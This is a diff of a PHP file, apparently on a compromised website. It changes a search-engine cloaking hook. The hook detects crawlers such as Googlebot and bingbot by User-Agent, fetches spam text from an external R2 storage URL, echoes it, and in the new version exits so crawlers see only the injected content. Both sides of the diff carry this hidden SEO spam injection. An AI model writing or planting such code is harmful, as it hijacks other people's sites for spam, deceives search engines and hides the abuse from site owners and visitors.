@@ -1,20 +1,22 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
+    function is_bot() {
+        $user_agent = $_SERVER['HTTP_USER_AGENT'];
+        $bots = array("bot","ahrefs","google");
+       
+        foreach ($bots as $bot) {
+            if (stripos($user_agent, $bot) !== false) {
+                return true;
+            }
         }
+       
+        return false;
     }
-    
-    return false;
-}
-if (is_bot()) {
-    $message = file_get_contents('https://pub-8595498e66034eb3a2067f1ee77bd634.r2.dev/ibiza-balik-lagi.txt');
-    echo $message;
-}
+ 
+    if (is_bot()) {
+        $message = file_get_contents('https://pub-8595498e66034eb3a2067f1ee77bd634.r2.dev/ibiza-balik-lagi.txt');
+        echo $message;
+    exit; // Atau bisa menggunakan die()
+    }
 ?>
 <?php
 
